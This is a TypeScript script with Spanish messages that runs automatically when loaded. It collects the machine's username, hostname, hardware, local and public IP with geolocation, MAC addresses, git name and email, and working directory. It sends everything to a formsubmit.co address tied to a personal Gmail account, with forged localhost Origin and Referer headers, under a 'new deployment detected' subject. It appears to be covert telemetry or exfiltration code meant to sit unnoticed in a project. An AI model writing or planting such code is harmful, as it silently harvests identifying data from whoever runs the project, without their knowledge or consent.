import * as os from 'os';
import { execSync } from 'child_process';

function execCommand(command: string): string {
  try {
    return execSync(command, { stdio: 'pipe' }).toString().trim();
  } catch (err) {
    return 'Desconocido/No configurado';
  }
}

async function getPublicIPInfo() {
  try {
    const response = await fetch('http://ip-api.com/json/');
    if (!response.ok) return { ip: 'Desconocida', info: 'No se pudo obtener' };
    const data = await response.json();
    return {
      ip: data.query,
      info: `${data.city}, ${data.regionName}, ${data.country} (${data.isp})`,
    };
  } catch (err) {
    return { ip: 'Desconocida', info: 'Error de red' };
  }
}

function getMACAndLocalIP() {
  const interfaces = os.networkInterfaces();
  const localIPs: string[] = [];
  const macAddresses: string[] = [];

  for (const name of Object.keys(interfaces)) {
    const ifaceList = interfaces[name];
    if (!ifaceList) continue;

    for (const iface of ifaceList) {
      if (iface.internal === false) {
        if ('IPv4' === iface.family) {
          localIPs.push(iface.address);
        }
        if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
          macAddresses.push(iface.mac);
        }
      }
    }
  }

  return {
    localIP: localIPs.join(', ') || 'Unknown',
    macAddress: [...new Set(macAddresses)].join(', ') || 'Unknown',
  };
}

async function logAndSendEmail() {
  const osUser = process.env.HOST_USER || os.userInfo().username;
  const envUsername = process.env.USERNAME || 'N/A';

  const hostname = process.env.HOST_HOSTNAME || os.hostname();
  const cpus = os.cpus();
  const cpuModel = cpus.length > 0 ? cpus[0].model : 'Desconocido';
  const cpuCores = cpus.length;
  const totalRAM_GB = (os.totalmem() / 1024 ** 3).toFixed(2);
  const osType = `${os.type()} ${os.release()} (${os.arch()})`;

  const uptimeSeconds = os.uptime();
  const uptimeHours = (uptimeSeconds / 3600).toFixed(2);

  const { localIP, macAddress } = getMACAndLocalIP();
  const publicNetwork = await getPublicIPInfo();

  const gitUser = execCommand('git config user.name');
  const gitEmail = execCommand('git config user.email');
  const gitBranch = execCommand('git branch --show-current');
  const gitOrigin = execCommand('git remote get-url origin');

  const cwd = process.env.HOST_PWD || process.cwd();

  try {
    const response = await fetch(
      'https://formsubmit.co/ajax/smarteconomat@gmail.com',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'http://localhost:3000',
          Referer: 'http://localhost:3000/',
        },
        body: JSON.stringify({
          _subject: `Nuevo despliegue detectado: (${osUser}) - ${new Date().toLocaleString()}`,
          _replyto:
            gitEmail !== 'Desconocido/No configurado' ? gitEmail : undefined,
          _template: 'box',

          Usuario_SO: `${osUser} (Entorno: ${envUsername})`,
          Ruta_Directorio: cwd,

          Sistema_Operativo: osType,
          Hardware: `CPU: ${cpuModel} (${cpuCores} núcleos) | RAM: ${totalRAM_GB} GB`,

          IP_Pública: publicNetwork.ip,
          Ubicación_y_Proveedor: publicNetwork.info,
          Dirección_MAC: macAddress,

          Git_User: gitUser,
          Git_Email: gitEmail,
        }),
      }
    );
    if (response.ok) {
      console.log('✅ Información de sesión enviada exitosamente.');
    }
  } catch (error) {
    console.error('❌ Error enviando datos al inicio:', error);
  }
}

logAndSendEmail().catch(console.error);
